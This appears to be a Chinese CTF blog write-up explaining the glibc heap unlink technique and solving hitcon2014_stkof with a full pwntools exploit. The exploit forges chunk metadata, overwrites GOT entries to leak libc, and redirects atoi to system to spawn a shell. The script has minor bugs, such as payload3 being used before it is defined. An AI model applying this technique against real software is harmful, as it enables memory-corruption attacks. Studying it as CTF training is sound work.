---
title: Unlink
date: 2022-03-18 11:16:02
tags:
   - 堆
---

<!--more-->

# Unlink

![image-20220318112224504](https://s2.loli.net/2022/03/27/Dnbdx8jt7YreW1J.png)

## **Unlik原理**

这里参考星盟的视频

![image-20220318113047601](https://s2.loli.net/2022/03/27/VnMvSW46TwaeOYj.png)

这里的fd和bk分别指向bin中下一个空闲的chunk和上一个空闲的chunk，这里的转变我没看懂，但是自己手写一下就可以弄得很清楚了

![image-20220318114323910](https://s2.loli.net/2022/03/27/cvULxVtzigXW7bZ.png)

例如其实相当于把P释放吧(与前一个free堆块合并)，**断链之后 P 指针将指向 (&p-0x18)的内存** 

```
*chunk=p
p->fd=chunk-0x18 
p->bk=chunk-0x10
```

![image-20220318143511195](https://s2.loli.net/2022/03/27/W4HDosiAVqf51tY.png)

## 注意

**上图的FD和BK并不是指P堆块的前后两堆块!!!**

而是两个变量,只是把p->fd和p->bk具体化

```
举例:
chunk=0x602280,*chunk=p
p->fd=chunk-0x18=0x602268
p->bk=chunk-0x10=0x602270
绕过:
FD=p->fd=0x602268
BK=p->bk=0x602270
经过check:
FD->bk=0x602268+0x18=0x602280=BK=p
Bk->fd=0x602270+0x10=0x602280=FD=p

```

可以参考文章:

https://www.sohu.com/a/361734778_658302

## 例题hitcon2014_stkof

![image-20220318164854713](C:\Users\22761\AppData\Roaming\Typora\typora-user-images\image-20220318164854713.png)

程序没有开pie

IDa查看,main函数是个菜单

![image-20220318172945138](https://s2.loli.net/2022/03/27/bjA9KplqOUTLzky.png)

### create函数

但注意这里有个++,所以堆块序列从1开始

![image-20220318173040401](https://s2.loli.net/2022/03/27/k6BuK4SLxd9Tw3W.png)

可验证一下

![image-20220318173307666](https://s2.loli.net/2022/03/27/LV8lNv5m9XMdnUs.png)

### delete函数

![image-20220318173349368](https://s2.loli.net/2022/03/27/i3anUAKfmDbBYFO.png)

free正常

### edit函数

![image-20220318173711863](https://s2.loli.net/2022/03/27/4o92AqgNXKwSyke.png)

## 想法

存在堆溢出漏洞,又不是UAF,只能用unlink来做,先通过构造断链将 P 指针指向 FD(&p-0x18)的内存 ,然后在FD上实现任意地址写,而且本题没有开pie保护，先把free,puts和atoi函数写入,然后用system可以覆盖free或者atoi,如果覆盖free函数,那么之后只要free('/bin/sh\x00')系统就会自动调用system('/bin/sh');如果覆盖atoi函数,那只要直接send('/bin/sh')即可。

## EXP

```
# -*- coding: utf-8 -*- 
from pwn import *
context.log_level='debug'
p = process("./stkof")
elf=ELF('./stkof')
libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')

def alloc(size):
    p.sendline('1')
    p.sendline(str(size))
    p.recvuntil('OK\n')


def edit(idx, size, content):
    p.sendline('2')
    p.sendline(str(idx))
    p.sendline(str(size))
    p.send(content)
    p.recvuntil('OK\n')

def free(idx):
    p.sendline('3')
    p.sendline(str(idx))
alloc(0x80)
alloc(0x30)
alloc(0x80)
alloc(0x80)
free(2)
ptr=0x602150
fd=ptr-0x18
bk=ptr-0x10
payload=''
payload+=p64(0)+p64(0x31)+p64(fd)+p64(bk)#0x31是指示位，1代表占用，0代表free
payload=payload.ljust(0x30,'a')
payload+=p64(0x30)+p64(0x90)#0x30前一个堆块大小，0x90修改指示位
edit(2,0x40,payload)#使得ptr=FD
free(3)#释放第三个堆块，使它和第二个堆块合并产生unlink
gdb.attach(p)
puts_got=elf.got['puts']
puts_plt=elf.plt['puts']
atoi_got=elf.got['atoi']
free_got=elf.got['free']
payload1=''
payload1+=p64(0)+p64(puts_got)+p64(atoi_got)+p64(free_got)
edit(2,len(payload),payload)#覆盖四个指针
payload2=''
payload2+=p64(puts_plt)#用puts覆盖free函数
edit(2,len(payload2),payload2)
free(0)#泄露puts的真实地址
puts_addr=u64(p.recv(6).ljust(8,'\x00'))
#puts_addr=u64(p.recv('\x7f')[-6:].ljust(8,'\x00'))
offset=puts_addr-libc.sym['puts']
sys_addr=offset+libc.sym['system']
payload3+=p64(sys_addr)
# edit(2,len(payload3),payload3)#办法一，覆盖free函数
# payload4=p64('/bin/sh\x00')
# edit(1,len(payload4),payload4)
# free(1)
edit(1,0x8,payload3)#办法二，覆盖atoi函数
p.sendline('/bin/sh')
p.interactive()
```

## 总结

个人理解，可能有偏差

![image-20220320103238299](https://s2.loli.net/2022/03/27/yAUGChOmf6zw8VE.png)
